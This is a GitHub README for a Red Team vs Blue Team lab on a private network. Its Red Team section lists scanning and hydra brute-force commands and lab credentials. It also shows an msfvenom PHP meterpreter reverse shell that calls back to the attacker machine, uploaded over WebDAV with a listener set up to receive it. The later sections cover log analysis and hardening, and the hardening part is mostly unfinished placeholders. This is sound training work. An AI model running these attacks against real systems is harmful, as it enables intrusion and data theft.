# RedTeam_vs_BlueTeam
# Security Assessment, Analysis, and Hardening Project
This Red Team vs. Blue Team project is organized into the following sections:
- **Network Topology** Red Team vs. Blue Team live network environment
- **Red Team** Security Assessment
- **Blue Team** Log Analysis and Attack Characterization
- **Hardening** Proposed Alarms and Mitigation Strategies
___

In this activity, Red Team acts as a malicious actor attempting to gain unauthorized access to a network. Blue Team monitors and analyses the activity. The ultimate objective is for Blue Team to identify vulnerabilities and to improve network security. 

## Network Topology

In this environment Blue Team is defending against Red Team attacks.
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/3122a604b745c825d67c88767017092a2c29fa79/images/RvBNetworkTopology.png)

|  IP                     |  Machine              |  OS          |  Role                              |
|  -----------------------|:---------------------:|:------------:|:----------------------------------:|
|  192.168.1.0/24         | Network Address Range |              |                                    |
|  255.255.255.0          | Netmask               |              |                                    |
|  192.168.1.1            | Azure Hyper-V         | Windows 10   | Host Machine                       |
|  192.168.1.90           | Kali Linux            | Linux 2.6.32 | Attacking Machine                  |
|  192.168.1.100          | ELK-Stack             | Linux        | Network Monitoring / Kibana        |
|  192.168.1.105          | Capstone              | Linux        | Target Machine / Vulnerable Server |


---


## Red Team: Security Assessment
---
#### Exploitation #### 
---
#### Discover target IP ####

`ifconfig`

`netdiscover -Pr 192.168.1.0/16`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/netdiscover.png)

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/netdiscover2.png)

`nmap 192.168.1.90/24`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/nmap.png)

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/nmap2.png)



#### Service and Version Scan ####

`nmap -A --script-vuln -v 192.168.1.105`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/nmap-a.png)

#### Navigate Webserver ####

`dirb http://192.168.1.105`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/dirb.png)

Access `http://192.168.1.105` via VM web browser

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/browse1.png)

Navigate directories to identify the file containing information about the secret directory

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/browse2.png)



#### Brute Force ####

Brute force the password for the hidden directory using the ‘hydra’ command and access the secret folder 

`hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get “/company_folders/secret_folder/”`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/hydra1.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/hydra2.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/secfolder1.png)



#### Password Hash ####

Break the hashed password using crackstation.net

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/crack1.png)

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/crack2.png)



#### SSH ####

SSH into Ashton's account to locate flag

`ssh ashton@192.168.1.105`
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/ssh1.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/ssh2.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/ssh3.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/ssh4.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/ssh5.png)



#### WebDAV ####

Connect to the server via WebDAV

Useername: `ryan` Password: `linux4u`
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/webdav1.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/webdav2.png)



#### Reverse Shell ####

Upload a PHP reverse shell payload

Create ‘shell.php’ shell script
`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 -f raw -o shell.php`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell1.png)

Upload payload to WebDAV system

`cadaver http://192.168.1.105/webdav`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell2.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell3.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/revshell4.png)

Execute payload that you uploaded to the site - open up a meterpreter session

Setup listener

`msfconsole`

`use multi/handler`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/list1.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/list2.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/list3.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/list4.png)

Once ‘shell.php’ shell script is uploaded to target website users on target network that click the script will activate it and attacking Kali machine will connect

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/shellupload.png)

Meterpreter session is now open
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/meterpretersession_open.png)

Acquire interactive reverse ‘shell’

`python -c 'import pty: pty.spawn("/bin/bash")'www-data@server:/var/www/webdav$`
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/intrevshell.png)



#### Exfiltration ####
Find and capture flag
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/flg1.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/flg2.png)

Exit back to meterpreter session
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/exitbackmeterpreter.png)

Download ‘flag.txt’ to Kali machine
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/5e7d95a2733bf76be2c4a7fad1476129a63cd39d/images/dwnlodflg.png)



## Vulnerabilities ##


---


![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ae79e10c5cbb97c36f8418b6d3eef06538f77ada/images/pp7.png)

#### **CWE-312: Cleartext Storage of Sensitive Information** ####

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ae79e10c5cbb97c36f8418b6d3eef06538f77ada/images/pp8.png)

#### **CWE-522: Insufficiently Protected Credentials** ####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ae79e10c5cbb97c36f8418b6d3eef06538f77ada/images/pp10.png)

#### **CWE-434: Unrestricted Upload of Dangerous File with Dangerous Type** ####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/3c235d16aa1dd6a13f92e7d80b1a30c06eab783b/images/pp10b.png)



---


## Blue Team: Log Analysis and Attack Characterization
---


---

#### 1. ID Offensive Traffic ####
---
`source.ip: 192.168.1.90` `destination.ip: 192.168.1.105`
`user_agent.original:Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1a.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1b.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1c.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1d.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1e.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1f.png)

##### **_When did the interaction occur?_** #####

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1g.png)

Between 12:30 and 15:30 on 2021 December 8

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1h.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1i.png)

##### **_What responses did the victim send back?_** #####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1j.png)
Response Codes

##### **_What data is concerning from the Blue Team perspective?_** #####

Data indicating the sudden spike in traffic and data indicating successful malicious traffic connection is concerning from a Blue Team perspective.

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/1k.png)

#### 2. Find the Request for the Hidden Directory ####
---
`source.ip: 192.168.1.90` `destination.ip: 192.168.1.105`
`query:GET/company_folders/secret_folder`

(https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2a.pnghttps://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2a.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2b.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2c.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2d.png)

31,064 requests were made from 192.168.1.90 to the secret directory at http://192.168.1.105/company_folders/secret_folders/ roughly between December 28, 13:33:30 and December 28, 15:14:00.


##### **_Which files were requested? What information did they contain?_** #####

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/2e.png)
Requests were made to access HTML text in ISO character set.

##### **_What kind of alarm would you set to detect this behavior in the future?_** #####

Creating an alert to notify administrators of when three or more password login attempts are failed in succession.

##### **_Identify at least one way to harden the vulnerable machine that would mitigate this attack._** #####

Create a timed lockout rule to prevent IPs or specific user credentials from being used for attempted logins after the failed password threshold is reached.

#### 3. Identify the Brute Force Attack ####
---
`source.ip: 192.168.1.90` `destination.ip: 192.168.1.105`
`user_agent.original:Mozilla/4.0(Hydra)`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3a.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3b.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3c.png)

##### **_Can you identify packets specifically from Hydra?_** #####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3d.png)

##### **_How many requests were made in the brute force attack?_** #####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3e.png)

Two brute force attacks occurred. One from 13:30 to 13:34 and another at 15:12:55 to 15:14:00. There were a combined 31,064 requests made.
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3f.png)

##### **_How many requests had the attacker made before discovering the correct password in this one?_** #####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3g.png)

The first attack made 16,236 before discovering the password.
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3h1.png)

The second attack made 14,828 requests before discovering the password.
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/235e488cc6b19d0e623e80614952038af940e521/images/3i.png)

##### **_What kind of alarm would you set to detect this behavior in the future?_** ##### 

Create a baseline for what is a normal number of requests over time. Trigger an alert when the upper threshold of that baseline is exceeded.

##### **_Identify at least one way to harden the vulnerable machine that would mitigate this attack._** ##### 

Limiting the amount of login attempts per user or IP to lockout excessive traffic requests. 
Establishing robust password practices will help limit the likelihood of successful brute force attacks.

Password length, character requirements, and/or updated passwords every 1-3 months depending on security needs.

#### 4. Find the WebDAV Connection ####
---
`source.ip: 192.168.1.90` `destination.ip: 192.168.1.105`
`query:GET/webdav/`

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4a.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4b.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4c.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4d.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4e.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4f.png)

##### **_How many requests were made to this directory?_** #####

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/4g.png)
20

##### **_Which file(s) were requested?_** ##### 
Access to the HTML text file with an ISO character set located at http://192.168.1.105/webdav is being requested.

##### **_What kind of alarm would you set to detect this behavior in the future?_** ##### 

Create an alarm that triggers when non-approved IP addresses attempt to access WebDAV.

##### **_Identify at least one way to harden the vulnerable machine that would mitigate this attack._** ##### 

Monitor IPs and user credentials attempting to access WebDAV. Whitelist approved IP addresses. Reduce user access to WebDAV. Switch to HTTPS.

#### 5.	Identify the Reverse Shell and Meterpreter Traffic. ####
---
`source.ip: 192.168.1.90` `destination.ip: 192.168.1.105`
`query:GET/webdav/shell.php`

##### **_Identify the traffic from the meterpreter session ‘url.path: /webdav/shell.php’_** #####
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/5a.png)
![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ef13927b37a1ca83d4082f0a3d2b27cfca4bc321/images/5b.png)

##### **_What kind of alarm would you set to detect this behavior in the future?_** #####
Create an alarm to monitor for malicious uploads.

##### **_Identify at least one way to harden the vulnerable machine that would mitigate this attack._** #####
Maintain up-to-date anti-virus and anti-malware software. Monitor open ports (such as 22 and 80) closely for suspicious traffic. Maintain robust firewall preventing suspicious file uploads to internal network systems.



## Hardening: Proposed Alarms and Mitigation Strategies


---


### **Mitigation: Blocking the Port Scan** ####
---
+ ##### **Alarm** #####
Create
+ ##### **System Hardening** #####
The network

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ae79e10c5cbb97c36f8418b6d3eef06538f77ada/images/pp33.png)
---

### **Mitigation: Finding the Request for the Hidden Directory** ####
---
+ ##### **Alarm** #####
Create
+ ##### **System Hardening** #####
The network

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ae79e10c5cbb97c36f8418b6d3eef06538f77ada/images/pp34.png)

### **Mitigation: Preventing Brute Force Attacks** ####
---
+ ##### **Alarm** #####
Create
+ ##### **System Hardening** #####
The network

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ae79e10c5cbb97c36f8418b6d3eef06538f77ada/images/pp35.png)

### **Mitigation: Detecting the WebDAV Connection** ####
---
+ ##### **Alarm** #####
Create
+ ##### **System Hardening** #####
The network

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ae79e10c5cbb97c36f8418b6d3eef06538f77ada/images/pp36.png)

### **Mitigation: Identifying Reverse Shell Upoloads** ####
---
+ ##### **Alarm** #####
Create
+ ##### **System Hardening** #####
The network

![image](https://github.com/duffian/RedTeam_vs_BlueTeam/blob/ae79e10c5cbb97c36f8418b6d3eef06538f77ada/images/pp37.png)
